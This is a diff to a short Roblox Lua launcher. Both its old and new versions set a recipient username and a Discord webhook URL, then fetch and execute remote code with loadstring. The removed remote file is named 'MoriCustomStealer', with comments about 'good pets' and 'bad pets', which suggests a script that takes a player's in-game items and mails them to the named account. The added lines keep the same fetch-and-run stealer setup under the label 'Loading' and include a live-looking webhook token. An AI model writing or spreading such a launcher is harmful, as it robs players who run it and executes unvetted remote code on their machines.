@@ -1,11 +1,5 @@
+_G.Username "IAmNobodyFRar" 
+_G.HubName "Loading" 
+_G.WebhookUrl "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG"  
 
-UserName = "IAmNobodyFRar" -- good pets
-Webhook = "https://discord.com/api/webhooks/1151122534595567676/0Cq1FU8qckQ29KywHvJAbeHjXAMrghGCViMaKlApVBiWoenPacfGlTR4RXyz9-fp_rqG" -- pings for pets
-UserName2 = "IAmNobodyFRar" -- bad pets
-
-_G.MailMessage = "Im Smart you aint." -- Mail Message !
-_G.ScriptTitle = "MilkUp!" -- Loading Screen Title
-_G.ScriptTitle2 = "MilkUp!" -- Put Same Title
-_G.WebhookName = "Captain Hook" -- Webhook name 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idk/main/MoriCustomStealer", true))()
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
